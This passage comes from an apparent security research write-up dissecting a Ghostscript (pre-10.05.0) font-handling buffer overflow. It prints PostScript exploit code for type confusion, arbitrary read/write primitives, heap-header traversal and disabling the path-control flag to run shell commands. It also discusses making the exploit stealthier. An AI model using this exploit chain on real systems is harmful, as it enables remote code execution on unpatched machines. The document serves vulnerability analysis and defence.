<p>In the next line, we undefine the <code>./notdef</code> glyph in the font’s <code>/CharacterCode</code> dictionary. This means that the font will never execute that glyph when the font encounters some undefined character code.</p>
<p>We then fill up the <code>TEXT</code> variable to be the character codes we want to run so it sets <code>TEXT = [0x0, 0x2, 0x0 …]</code>. Then we set the position of the cursor to an arbitrary location so we can start rendering text.</p>

<h4 class="relative group">Triggering the Exploit 
    <div id="triggering-the-exploit" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#triggering-the-exploit" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>Finally, we run the heart of the exploit by attempting to display the TEXT variable using the specially crafted font.</p>
<p>Because <code>TEXT = [0x0, 0x2, 0x0 …]</code>, it will run the code for the glyph that corresponds to character code 0, which is <code>cs0</code>. It will then run the code for the glyph that corresponds to the character code 2, which is <code>cs2</code>. Looking at <code>cs0</code>, the first thing it does is:</p>
<p><code>TEXT[0] = 1</code></p>
<p>Now the code in <code>/MAIN</code> has just set <code>TEXT = [0x0, 0x2]</code>. So, after this command, it is now</p>
<p><code>TEXT = [0x1, 0x2] </code></p>
<p>The code then creates a 312500 element array named <code>TARGET</code> which is used later in the exploit. Finally, it places <code>OBJARR</code> into <code>TARGET</code> at offset <code>REFIDX</code>. As such, <code>TARGET</code>[249888] is a copy of <code>OBJARR</code> (important for type confusion). We found that <code>REFIDX</code> accounts for the empty space between unicode_return and <code>TARGET</code> (which we will see later). The heap buffers have been specially crafted in such a way that this hardcoded value works consistently.</p>
<p>After <code>cs0</code> finishes, our assumption is that it attempts to display the output of <code>cs1</code> before running the code for <code>cs2</code>,. However, since the value at <code>TEXT[0]</code> had changed in between to 1, it now will display the glyph for character code 1, which is <code>&lt;0E&gt;</code>, instead of going to <code>cs2</code>. Since glyph 1 has no mapping in <code>/CharStrings</code>, there would be an error. Normally, the font would see that character code 1 has no mapping and would move to the execution of <code>/.notdef</code>. However, because the script had previously undefined it, it attempts to fall back on the <code>/GlyphNames2Unicode</code> dictionary which runs <code>gs_font_map_glyph_to_unicode</code> to attempt to get the Unicode UTF-16 code for a glyph, which we presume occurs because it maps <code>cs1</code> or <code>0E</code> to <code>SOURCE1</code>. This triggers the overflow and overwrites data from <code>SOURCE1</code> and <code>SOURCE2</code> (which we control) into the target buffer, which is stored closeby to <code>unicode_return</code>. Specifically, it overwrites the type of the <code>OBJARR</code> ref we placed in <code>TARGET</code>.</p>

<h3 class="relative group">The Exploit 
    <div id="the-exploit" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#the-exploit" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Looking at the vulnerable code again, we see that we are copying from a buffer in <code>v</code> to <code>unicode_return</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">memcpy</span><span class="p">(</span><span class="n">unicode_return</span><span class="p">,</span> <span class="n">v</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">.</span><span class="n">const_bytes</span><span class="p">,</span> <span class="n">l</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">short</span><span class="p">));</span>
</span></span></code></pre></div><p><code>unicode_return</code> is temporarily allocated one function up, in <code>txt_get_unicode</code>, and v is a Ghostscript variable that we control. With dynamic analysis, we found that <code>v</code> is <code>SOURCE1</code>, meaning that <code>v-&gt;value.const_bytes</code> is a buffer of size 4000002.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">unicode</span> <span class="o">=</span> <span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)</span><span class="nf">gs_alloc_bytes</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">memory</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="s">&#34;temporary Unicode array&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="n">font</span><span class="o">-&gt;</span><span class="n">procs</span><span class="p">.</span><span class="nf">decode_glyph</span><span class="p">((</span><span class="n">gs_font</span> <span class="o">*</span><span class="p">)</span><span class="n">font</span><span class="p">,</span> <span class="n">glyph</span><span class="p">,</span> <span class="n">ch</span><span class="p">,</span> <span class="n">unicode</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span></span></code></pre></div><p>Looking at how <code>unicode_return</code> was allocated, we can see that it is also of size length (4000002). Thus, we are copying past the end of <code>SOURCE1</code> into a space past the end of <code>unicode_return</code>. As mentioned earlier, we set up <code>TARGET</code> and <code>SOURCE2</code> such that they would be in these spaces.</p>
<img src="./Images/drawing0.jpg" alt="printing ref_s variable" style="display:block; margin:auto;">
<p>Looking at the diagram, it is clearer that <code>REFIDX</code> is the index of our target (copy of <code>OBJARR</code>) in <code>TARGET</code>, and <code>REFOFS</code> is the offset of our overwrite (<code>0x127e</code>, which corresponds to type string).</p>
<p>This size of <code>SOURCE1</code> was specially chosen. The last 4 bytes of the memcpy will overwrite the type field of the variable <code>OBJARR</code>. Before the overflow occurs, <code>OBJARR</code> had a type of 0x04 which corresponds to a <code>t_array</code>. But we overwrote it to <code>0x12</code>, setting it to of type string. However, as we will later see, this also overwrites the malloc and clump headers of <code>TARGET</code>, which will cause Ghostscript to crash when trying to clean up.</p>
<p>As you can see in the image, the reason <code>TARGET</code> is initialized in <code>/cs0</code> and not before we trigger the exploit is because we need <code>TARGET</code> to consistently be right after <code>unicode_return</code>.</p>
<p>As a brief aside, we investigated how the allocator works and why there are 750000 zero bytes in between <code>SOURCE1</code> and <code>SOURCE2</code> to understand more on why we set them up in a specific order with specific indices.
Looking at the space before <code>SOURCE2</code>, we can find that there are headers corresponding to <code>gs_malloc_block_t</code>, and more specifically, the headers contain pointers, size, and a client name that is <code>“large string clump”</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// /base/gsmalloc.h
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="mi">25</span> <span class="cm">/* Define a memory manager that allocates directly from the C heap */</span>
</span></span><span class="line"><span class="cl"><span class="mi">26</span> <span class="k">typedef</span> <span class="k">struct</span> <span class="n">gs_malloc_block_s</span> <span class="kt">gs_malloc_block_t</span><span class="p">;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// /base/gsmalloc.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="mi">89</span>  <span class="cm">/* We must make sure that malloc_blocks leave the block aligned. */</span>
</span></span><span class="line"><span class="cl"><span class="mi">90</span>  <span class="cm">/*typedef struct gs_malloc_block_s gs_malloc_block_t; */</span>
</span></span><span class="line"><span class="cl"><span class="mi">91</span>  <span class="err">#</span><span class="n">define</span> <span class="n">malloc_block_data</span>\
</span></span><span class="line"><span class="cl"><span class="mi">92</span>          <span class="kt">gs_malloc_block_t</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>\
</span></span><span class="line"><span class="cl"><span class="mi">93</span>          <span class="kt">gs_malloc_block_t</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>\
</span></span><span class="line"><span class="cl"><span class="mi">94</span>          <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>\
</span></span><span class="line"><span class="cl"><span class="mi">95</span>          <span class="kt">gs_memory_type_ptr_t</span> <span class="n">type</span><span class="p">;</span>\
</span></span><span class="line"><span class="cl"><span class="mi">96</span>          <span class="kt">client_name_t</span> <span class="n">cname</span>
</span></span><span class="line"><span class="cl"><span class="mi">97</span>  <span class="k">struct</span> <span class="n">malloc_block_data_s</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">98</span>      <span class="n">malloc_block_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">99</span>  <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="mi">100</span> <span class="k">struct</span> <span class="n">gs_malloc_block_s</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">101</span>     <span class="n">malloc_block_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">102</span> <span class="cm">/* ANSI C does not allow zero-size arrays, so we need the following */</span>
</span></span><span class="line"><span class="cl"><span class="mi">103</span> <span class="cm">/* unnecessary and wasteful workaround: */</span>
</span></span><span class="line"><span class="cl"><span class="mi">104</span> <span class="err">#</span><span class="n">define</span> <span class="nf">_npad</span> <span class="p">(</span><span class="o">-</span><span class="nf">size_of</span><span class="p">(</span><span class="k">struct</span> <span class="n">malloc_block_data_s</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">ARCH_ALIGN_MEMORY_MOD</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="mi">105</span>     <span class="n">byte</span> <span class="n">_pad</span><span class="p">[(</span><span class="n">_npad</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nl">ARCH_ALIGN_MEMORY_MOD</span> <span class="p">:</span> <span class="n">_npad</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl"><span class="mi">106</span> <span class="err">#</span><span class="n">undef</span> <span class="n">_npad</span>
</span></span><span class="line"><span class="cl"><span class="mi">107</span> <span class="p">};</span>
</span></span></code></pre></div><img src="./Images/large_string_clump.jpg" alt="printing 'large string clump' in gdb" style="display:block; margin:auto;">
<p>We can see that our large strings are being allocated with the <code>alloc_acquire_clump</code> function using a size of <code>asize</code>.</p>
<img src="./Images/gs_large_string_clump.jpg" alt="printing 'ghostscript source code showing how large string clumps are allocated" style="display:block; margin:auto;">
<p>Although asize is calculated using a lot of unreadable bit manipulation, we can see that it is approximately 750000 more bytes than what we requested (<code>nbytes</code>).</p>
<img src="./Images/gs_string_clump_space_code.jpg" alt="showing expanded code for determining the bytes to allocate for a string of a given size" style="display:block; margin:auto;">
<p>Combined with the fact that allocations are page aligned, the reason why there is a 751358 bytes in between <code>SOURCE1</code> and <code>SOURCE2</code> is because of Ghostscript’s <code>i_alloc_string_immovable</code> function.</p>
<p>We experimented with allocating different sized strings and seeing where they were placed in memory, and noticed that strings less than around 250000 length are placed in the normal Ghostscript heap.</p>
<p>With further analysis, we found that malloc decides whether strings are put on the heap or in their own clumps, which explains why the author uses 4000000 sized strings.</p>
<img src="./Images/string_size_check.jpg" alt="showing source code of the string size check determining whether to keep the string buffer in clumps or not" style="display:block; margin:auto;">
<p>Additionally, the reason there is no padding between <code>unicode_return</code> and <code>TARGET</code> is because it is created using a different allocator function (<code>alloc_obj</code> instead of <code>i_alloc_string</code>).</p>
<img src="./Images/txt_get_unicode.jpg" alt="allocating with txt_get_unicode" style="display:block; margin:auto;">
<br />
<img src="./Images/alloc_obj.jpg" alt="allocating with alloc_obj" style="display:block; margin:auto;">

<h4 class="relative group">/DONE Function: Type Confusion For Arbitrary Reads and Writes 
    <div id="done-function-type-confusion-for-arbitrary-reads-and-writes" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#done-function-type-confusion-for-arbitrary-reads-and-writes" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>After all of this is done, the program renders 2 from <code>TEXT</code> using <code>/cs2</code>, which just calls the <code>/DONE</code> function.</p>
<p>From the buffer overflow of /cs0 and /cs1, we can see that we now have 2 references to the same array, but of different types.</p>
<p>Type confusion is a common strategy used in VM escapes. In this case, the exploit is using it to achieve arbitrary reads and writes. By changing the type to a string we can modify the pointer of <code>STROBJ</code> to read/write from any location in memory.</p>
<p><code>TARGET[REFIDX]</code> contained a copy of <code>OBJARR</code> in <code>/cs0</code> and now <code>/DONE</code> makes use of this for the next steps of the exploit. It sets <code>MAGIC</code> to <code>TARGET[REFIDX]</code>, so <code>MAGIC</code> points to the same thing <code>OBJARR</code>, except that it is of type string.</p>
<img src="./Images/drawing1.jpg" alt="drawing showing how the vulnerability " style="display:block; margin:auto;">
<p>Next it defines two more variables <code>STRPTR</code> and <code>ARRPTR</code>. The exploit first grabs the substring of <code>MAGIC</code> using the <code>getinterval</code> operator, starting from the 8th character and ending at the 15th character and sets it to <code>STRPTR</code>.  Since <code>MAGIC</code> is of type string, using <code>getinterval</code> will “take the substring” by making a new pointer to that substring.</p>
<img src="./Images/drawing2.jpg" alt="allocating with alloc_obj" style="display:block; margin:auto;">
<pre tabindex="0"><code>First element: OBJARR[0]			
MAGIC[0:8] = STROBJ tas struct		
MAGIC[8:16] = ptr to STROBJ string		

Second element: OBJARR[1]			
MAGIC[16:24] = ARROBJ tas struct		
MAGIC[24:32] = ptr to ARROBJ array
</code></pre><p>In the end, <code>STRPTR</code> is just a pointer to <code>STROBJ's</code> pointer and <code>ARRPTR</code> is just a pointer to <code>ARROBJ's</code> pointer. Therefore, if we write to <code>STRPTR's</code> string, then we overwrite <code>STROBJ's</code> pointer.</p>
<p>As a small note, <code>/arrptr</code> and <code>/ARRPTR</code> do the exact same thing, as they are both of type string and point to <code>ARROBJ’s</code> pointer.</p>
<p>We now define some functions to leverage this type confusion.</p>
<ul>
<li><code>/copystr</code>: simply takes two strings and copies data from one to another</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/copystr</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_length</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_srcidx</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_srcstr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_dstidx</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_dststr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_length</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_dststr</span> <span class="nf">_dstidx</span> <span class="nf">_srcstr</span> <span class="nf">_srcidx</span> <span class="nf">get</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_srcidx</span> <span class="nf">_srcidx</span> <span class="mf">1</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_dstidx</span> <span class="nf">_dstidx</span> <span class="mf">1</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">repeat</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span></code></pre></div><ul>
<li><code>/ptradd</code>: takes a string variable in which its value is a pointer (say pointer A) and increments A by an amount</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/ptradd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_inc</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_ptr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_new</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="mf">0</span> <span class="mf">1</span> <span class="mf">7</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_i</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_b</span> <span class="nf">_ptr</span> <span class="nf">_i</span> <span class="nf">get</span> <span class="nf">_inc</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_inc</span> <span class="nf">_b</span> <span class="mf">-8</span> <span class="nf">bitshift</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_new</span> <span class="nf">_i</span> <span class="nf">_b</span> <span class="mf">255</span> <span class="nf">and</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">for</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_new</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span></code></pre></div><ul>
<li><code>/arbrd</code>: overwrites the pointer of <code>STROBJ</code> by writing to <code>STRPTR</code>, and then reads what <code>STROBJ</code> is pointing at by accessing it from <code>OBJARR</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/arbrd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_buf</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_adr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">STRPTR</span> <span class="mf">0</span> <span class="nf">_adr</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_buf</span> <span class="mf">0</span> <span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">get</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="nf">length</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span></code></pre></div><ul>
<li><code>/arbwr</code>: does the same thing as arbrd, but writes to what <code>STROBJ</code> is pointing at instead of reading it</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/arbwr</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_buf</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_adr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">STRPTR</span> <span class="mf">0</span> <span class="nf">_adr</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">    <span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">get</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="nf">length</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span></code></pre></div>
<h4 class="relative group">Disabling the security flags 
    <div id="disabling-the-security-flags" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#disabling-the-security-flags" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>Now our goal is to locate the security flags. We do this by traversing the malloc headers, which form a doubly linked list. This is easily done with the <code>plist</code> command in pwndbg:</p>
<img src="./Images/plist.jpg" alt="allocating with alloc_obj" style="display:block; margin:auto;">
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/arrsz</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/next</span> <span class="nf">arrptr</span> <span class="mf">-40</span> <span class="nf">ptradd</span> <span class="mf">-48</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">next</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">arrsz</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arrsz</span> <span class="p">&lt;</span><span class="nf">d886010000000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span> <span class="c1">% 100056
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">/next</span> <span class="nf">arrptr</span> <span class="mf">-56</span> <span class="nf">ptradd</span> <span class="mf">-48</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">next</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">arrsz</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arrsz</span> <span class="p">&lt;</span><span class="nf">e886010000000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span> <span class="c1">% 100072
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="s">(unknown header layout)</span> <span class="nf">=</span> <span class="nf">quit</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">loop</span>
</span></span></code></pre></div><p>We first check at an offset -88 and -104 from the start of <code>OBJARR</code>, checking if the value at that offset is equal to the size of <code>ARROBJ</code> to verify which type of chunk header layout Ghostscript is using (in 10.04.0’s case it is offset -88). (This is the whole reason why <code>ARROBJ</code> must be size 6250, since we check if it’s size <code>0x186d8 = 16*6250 + 56</code>). At both of these offsets, the PoC then checks for the size for that malloc block (100056/0x186d8 and 100072/0x186e8) which can be seen in the image above as the first two malloc chunk headers in the list. If the size check passes, then the exploit code can continue knowing the pointer is a valid malloc chunk header.</p>
<p>Once again, we are traversing the malloc chunk headers linked list, searching for one where the next node has a <code>cname</code> equal to <code>“gs_lib_ctx_init(core)”</code>. Note that the *next pointer is offset 0 from the structure and <code>cname</code> is offset 32 from the structure. The node with the matching string seems to always be the third to last node in the linked list and the linked list seems to be a bit short of 500 nodes each time.</p>
<img src="./Images/last_nodes.jpg" alt="showing the last 6 nodes of the malloc chunk header linked list with the 'gs_lib_ctx_init(core)' string being part of the third to last node" style="display:block; margin:auto;">
<p>After finding the correct pointer, the exploit stores it in the vairable <code>head</code>. 48 bytes after <code>head</code> is a struct of type <code>gs_lib_ctx_core_t</code> which contains a field called <code>“is_path_control_active”</code> which is a boolean that will let Postscript execute arbitrary commands. The exploit then sets this field to 0, thus allowing the execution of arbitrary commands.</p>
<p><strong>Flag before being turned off:</strong></p>
<img src="./Images/flag_on.jpg" alt="showing the 'is_path_control_active' flag as part of the gs_lib_ctx_core_t before being turned off set as 1 " style="display:block; margin:auto;">
<p><strong>Flag after being turned off:</strong></p>
<img src="./Images/flag_off.jpg" alt="showing the 'is_path_control_active' flag as part of the gs_lib_ctx_core_t after being turned off set as 0" style="display:block; margin:auto;">
<p>This is effectively the end of the exploit, as all thats left to do is run any command we want. In the case of the PoC, it runs <code>ls</code> and prints the output to the terminal but this could be any command such as a reverse shell, creating a cronjob, reading a file, etc.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="s">(%pipe%ls -laf)</span> <span class="s">(w)</span> <span class="nf">file</span>
</span></span></code></pre></div><p>As a summary of everything the exploit just did:</p>
<ol>
<li>Initialized <code>OBJARR</code>, <code>STROBJ</code>, <code>ARROBJ</code>, and <code>TARGET</code> such that it would be able to arbitrarily read/write and get malloc header primitives after the buffer overflow.</li>
<li>Created a malicious font with <code>SOURCE1</code> and <code>SOURCE2</code> to conduct a buffer overflow onto a copy of <code>OBJARR</code> in <code>TARGET</code>, setting its type to a string.</li>
<li>Used the type confusion to traverse the malloc chunk linked list until we find <code>gs_lib_ctx_init(core)</code></li>
<li>Overwrote the <code>path_control_active</code> field in the context struct and execute arbitrary commands</li>
</ol>

<h3 class="relative group">Next Steps 
    <div id="next-steps" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#next-steps" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The very last thing the exploit does is infinite loop in Postscript:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="p">{</span> <span class="mf">1</span> <span class="nf">pop</span> <span class="p">}</span> <span class="nf">loop</span>
</span></span></code></pre></div><p>When Ghostscript files are run, they will typically exit back to the interpreter. However, after executing our payload, it will enter into an infinite loop (intentionally). This is because the interpreter will crash (yes actually segfault) if we attempt to exit from the script, as we overwrite the header data for the clump containing /target during our buffer overflow. This is interesting because Ghostscript actually handles crashes and will exit gracefully if something goes wrong.</p>
<p><strong>Segfault:</strong>
<img src="./Images/segfault.jpeg" alt="showing what Ghostscript shows after segfaulting" style="display:block; margin:auto;"></p>
<p><strong>Graceful crash:</strong>
<img src="./Images/graceful_crash.jpeg" alt="showing what Ghostscript shows after gracefully crashing" style="display:block; margin:auto;"></p>
<p>When the interpreter tries to clean up the GhostScript heap, it will try to clean up the overwritten chunk and crash when it tries to access the nonexistent header data.</p>
<!-- <img src="./Images/before_after.png" alt="showing hexdump of the data between the end of SOURCE1 and start of SOURCE2 and what got overwritten from the buffer overflow" style="display:block; margin:auto;"> -->
<p><strong>Before buffer overflow:</strong>
<img src="./Images/hexdump_before.jpg" alt="showing hexdump of the data between the end of SOURCE1 and start of SOURCE2 before the buffer overflow" style="display:block; margin:auto;">
<br />
<img src="./Images/telescope_before.jpg" alt="showing the values of pointers of the data between the end of SOURCE1 and start of SOURCE2 before the buffer overflow" style="display:block; margin:auto;"></p>
<p><strong>After buffer overflow:</strong>
<img src="./Images/hexdump_after.jpg" alt="showing hexdump of the data between the end of SOURCE1 and start of SOURCE2 after the buffer overflow" style="display:block; margin:auto;">
<br />
<img src="./Images/telescope_after.jpg" alt="showing the values of pointers of the data between the end of SOURCE1 and start of SOURCE2 after the buffer overflow" style="display:block; margin:auto;"></p>
<p>Our goal was to edit the PoC such that the interpreter doesn’t crash or hang after the execution of the script so that the exploit can remain undetected. Obviously the point of a PoC is just to show that the exploit actually works but we wanted to see how someone would go about making it useful in a real world scenario.</p>
<p>We had two avenues to investigate: Controlling the data that the clump header data is overwritten with, or preventing Ghostscript from trying to clean up the clump.</p>
<p>Attempts to control the data that overwrites the clump header data weren’t fruitful. We needed a way to control the 1760 bytes of data immediately after the data of <code>SOURCE1</code> (specifically the 60 or so bytes at the end), so that we could repair the clump data for the clump containing /target.  We tried to resize the variables in the exploit so that <code>SOURCE1’s</code> data ended up adjacent to other data that we controlled. We found that the variables were simply positioned in the order that they were defined/allocated. However, as discussed earlier, the clumps that we are working with only accept larger sizes (&gt; ~250000 bytes), while smaller sized allocations go on the normal heap or other clumps. Additionally, since Ghostscript allocates a large amount of padding to the data for <code>refs</code> that scales with the size of the allocation, we found that we would not be able to get controllable data into the 1760 bytes, as any data adjacent to <code>SOURCE1</code> would be padding data of length &gt; 1760.</p>
<p>We then attempted to attack the heap. Further investigation revealed that the pointer to the clump is stored in the (non-Ghostscript) heap. This was promising, as we could potentially use the read/write primitives to overwrite the heap such that it loses the reference to the corrupted clump, potentially delaying or even preventing a crash. The crash happens in the <code>gc_objects_clear_marks</code> function called by <code>gs_gc_reclaim</code>. <code>gs_gc_reclaim</code> attempts to go through the objects in each clump and mark them to be freed or consolidated. It does this by traversing through the tree that contains references to every clump. However, references to adjacent nodes, as well as other data, are only stored in the header data for each clump, which are located on the Ghostscript heap. This is inaccessible to our read/write primitives, which stopped us in our tracks. The pointer for every clump is stored on the normal heap, so in theory if we can find some other structure in the heap containing the clumps or find the section in memory where they are stored, we can attempt to traverse it and linearly search for a clump with data unique to the clump (if any exists on the heap) or by its order. which is very far in the heap memory. Ultimately, we didn’t have the time to fully test this approach to see if it would be feasible, but any implementation would also likely be difficult to get consistently working, as it would be sensitive to variations in ordering on the heap or Ghostscript heap (i.e. if the interpreter was used before running the exploit).</p>

<h2 class="relative group">Impact 
    <div id="impact" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#impact" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>This affects all x64 Linux systems running Ghostscript versions prior to 10.05.0. The exploit also worked on an ARM 7.2 machine (again running Ghostscript versions prior to 10.05.0).</p>

<h2 class="relative group">Mitigations 
    <div id="mitigations" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#mitigations" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">GhostScript v10.05.1 Official Patch 
    <div id="ghostscript-v10051-official-patch" class="anchor"></div>
    
    <span
